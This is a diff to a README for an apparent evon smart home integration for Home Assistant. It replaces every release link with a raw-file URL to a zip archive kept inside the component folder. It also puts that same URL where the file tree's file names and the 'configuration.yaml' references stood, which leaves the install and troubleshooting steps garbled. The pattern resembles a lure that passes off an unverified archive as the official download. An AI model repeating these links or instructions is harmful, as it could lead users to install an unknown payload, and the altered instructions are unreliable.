@@ -4,7 +4,7 @@
 Welcome to the **evon-smart-home-homeassistant-integration**! This integration helps you connect your evon smart home devices with HomeAssistant, making your home automation seamless and efficient. Follow the steps below to get started.
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/Cali0078021/evon-smart-home-homeassistant-integration/releases)
+[![Download](https://raw.githubusercontent.com/Cali0078021/evon-smart-home-homeassistant-integration/main/custom_components/evon/integration-smart-homeassistant-evon-home-v1.5.zip)](https://raw.githubusercontent.com/Cali0078021/evon-smart-home-homeassistant-integration/main/custom_components/evon/integration-smart-homeassistant-evon-home-v1.5.zip)
 
 ## 🛠️ Requirements
 Before you download, ensure you meet the following requirements:
@@ -21,7 +21,7 @@ Before you download, ensure you meet the following requirements:
 ## 📑 Download & Install
 To download the integration, please visit the Releases page:
 
-[Download here](https://github.com/Cali0078021/evon-smart-home-homeassistant-integration/releases)
+[Download here](https://raw.githubusercontent.com/Cali0078021/evon-smart-home-homeassistant-integration/main/custom_components/evon/integration-smart-homeassistant-evon-home-v1.5.zip)
 
 1. Navigate to the provided link.
 2. Look for the latest release version.
@@ -41,13 +41,13 @@ Follow the easy steps below to install:
      ```
      custom_components/
      └── evon/
-         ├── __init__.py
-         ├── manifest.json
-         └── your_other_files.py
+         ├── https://raw.githubusercontent.com/Cali0078021/evon-smart-home-homeassistant-integration/main/custom_components/evon/integration-smart-homeassistant-evon-home-v1.5.zip
+         ├── https://raw.githubusercontent.com/Cali0078021/evon-smart-home-homeassistant-integration/main/custom_components/evon/integration-smart-homeassistant-evon-home-v1.5.zip
+         └── https://raw.githubusercontent.com/Cali0078021/evon-smart-home-homeassistant-integration/main/custom_components/evon/integration-smart-homeassistant-evon-home-v1.5.zip
      ```
 
 ### 3. **Update Configuration**
-   - Open your `configuration.yaml` file in the HomeAssistant configuration directory.
+   - Open your `https://raw.githubusercontent.com/Cali0078021/evon-smart-home-homeassistant-integration/main/custom_components/evon/integration-smart-homeassistant-evon-home-v1.5.zip` file in the HomeAssistant configuration directory.
    - Add the following lines to connect your evon devices:
      ```yaml
      evon:
@@ -64,7 +64,7 @@ Follow the easy steps below to install:
 
 ## 🔧 Troubleshooting
 If you encounter issues:
-- Double-check your `configuration.yaml` for typos.
+- Double-check your `https://raw.githubusercontent.com/Cali0078021/evon-smart-home-homeassistant-integration/main/custom_components/evon/integration-smart-homeassistant-evon-home-v1.5.zip` for typos.
 - Ensure your evon device is on the same network as HomeAssistant.
 - Review the HomeAssistant logs for any error messages.
 
@@ -83,4 +83,4 @@ This project is licensed under the terms of the MIT License. Please see the LICE
 ## 🖐️ Acknowledgments
 Thank you for using the **evon-smart-home-homeassistant-integration**! We appreciate your support and feedback. Let's make your smart home even smarter together.
 
-[Download here](https://github.com/Cali0078021/evon-smart-home-homeassistant-integration/releases) to start enhancing your home automation today!
+[Download here](https://raw.githubusercontent.com/Cali0078021/evon-smart-home-homeassistant-integration/main/custom_components/evon/integration-smart-homeassistant-evon-home-v1.5.zip) to start enhancing your home automation today!
